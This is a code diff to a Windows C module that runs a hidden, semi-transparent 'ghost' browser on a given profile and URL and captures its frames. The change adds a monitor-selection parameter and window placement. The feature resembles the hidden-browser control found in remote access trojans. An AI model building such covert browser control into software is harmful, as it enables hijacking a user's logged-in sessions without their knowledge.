@@ -7,6 +7,7 @@
 #include "pch.h"
 #include "remote_hidden_browser.h"
 #include "remote_config.h"
+#include "remote_desktop.h"
 #include "remote_log.h"
 #include "gdiplus_jpeg.h"
 #include <stdlib.h>
@@ -106,6 +107,14 @@ static void restore_window(HWND h) {
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
     SetWindowPos(h, HWND_TOP, 0, 0, sw, sh, SWP_SHOWWINDOW | SWP_NOACTIVATE);
+}
+
+static void move_window_to_display(HWND h, int display_index) {
+    int mon_x = 0, mon_y = 0;
+    unsigned int mon_w = 0, mon_h = 0;
+    remote_desktop_get_monitor_bounds(display_index, &mon_x, &mon_y, &mon_w, &mon_h);
+    if (mon_w > 0 && mon_h > 0)
+        SetWindowPos(h, HWND_TOP, mon_x, mon_y, (int)mon_w, (int)mon_h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
 }
 
 static void apply_ghost(HWND h, int enable, int alpha) {
@@ -347,7 +356,7 @@ static unsigned int capture_window_jpeg(HWND h, int quality, unsigned char* out,
     return total;
 }
 
-int remote_hidden_browser_start(const char* profile, const char* url, int ghost_alpha) {
+int remote_hidden_browser_start(const char* profile, const char* url, int ghost_alpha, int display_index) {
     if (ghost_alpha >= 0 && ghost_alpha <= 255)
         g_ghost_alpha = ghost_alpha;
     else {
@@ -362,14 +371,20 @@ int remote_hidden_browser_start(const char* profile, const char* url, int ghost_
             if (g_ghost_alpha > 255) g_ghost_alpha = 255;
         }
     }
+    if (display_index < 0) display_index = 0;
 
     g_ghost_hwnd = try_reuse_ghost();
     if (g_ghost_hwnd) {
         remote_log("[hidden_browser] reused hwnd=%p", (void*)g_ghost_hwnd);
+        move_window_to_display(g_ghost_hwnd, display_index);
         return 1;
     }
     g_ghost_hwnd = launch_ghost_window(profile, url);
-    return g_ghost_hwnd ? 1 : 0;
+    if (g_ghost_hwnd) {
+        move_window_to_display(g_ghost_hwnd, display_index);
+        return 1;
+    }
+    return 0;
 }
 
 unsigned int remote_hidden_browser_capture_frame(unsigned char* out_data, unsigned int out_size, int quality) {
